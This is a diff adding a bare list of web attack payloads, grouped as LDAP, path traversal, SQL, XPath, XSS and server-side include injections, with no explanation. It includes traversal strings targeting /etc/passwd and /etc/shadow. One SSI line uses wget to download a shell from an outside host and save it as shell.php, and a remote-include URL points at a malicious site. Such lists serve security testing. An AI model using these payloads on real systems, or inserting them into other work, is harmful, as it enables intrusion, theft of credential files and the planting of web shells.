@@ -1,0 +1,122 @@
+LDAP
+
+\21
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+(*)*)
+*)*
+*/*
+//*
+@*
+admin*
+admin*)((|userpassword=*)
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
+
+Path Travers
+
+/boot.ini
+\boot.ini
+/etc/passwd
+/../etc/passwd
+/../../etc/passwd
+/../../../../../etc/passwd
+../../../../../../etc/shadow
+/./././././././././././etc/passwd
+/./././././././././././etc/shadow
+/../../boot.ini
+/../../../../boot.ini
+\..\..\..\..\boot.ini
+/../boot.ini
+../boot.ini
+
+
+SQL injections
+
+'
+1'1
+[t]
+1 and 1=1
+1 or 1=1
+1' or '1'='1
+'%20or%20''='
+hi or 1=1 --"
+hi' or 1=1 --
+"hi"") or (""a""=""a"
+hi or a=a
+hi' or 'a'='a
+')--
+' or 0=0 --
+') or ('a'='a
+" or "a"="a
+) or (a=a
+
+
+
+Xpath injections
+
+' or '1'='1
+//*
+@*
+' or ''='
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+
+
+Cross Site scripting(XSS)
+
+<script>alert('xss')</script>
+<SCRIPT>alert('XSS');</SCRIPT>
+<script>alert(\"xss\")</script>
+1<ScRiPt>prompt(XSS)</ScRiPt>"
+//1<ScRiPt>prompt(XSS)</ScRiPt>
+'\"</scRipt><scRipt>alert('xss')</scRipt>
+<scRiPt>alert(XSS);</scrIPt>
+\"><scRipt>alert('xss')</scRipt>
+<script x>alert('XSS')<script y>
+javascript:alert(xss)
+<>javascript:alert('XSS')
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`">
+<audio src onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+
+server Side Include(SSI)
+
+<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
+<!--#exec cmd="ls" -->
+<!--#exec cmd="cd /root/dir/">
+<!--#exec cmd="dir" -->
+<!--#exec cmd="cd C:\admin\dir">
+<!--#config errmsg="File not found, informs users and password"-->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="DOCUMENT_URI" -->
+<!--#include file=”UUUUUUUU...UU”-->
+www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml
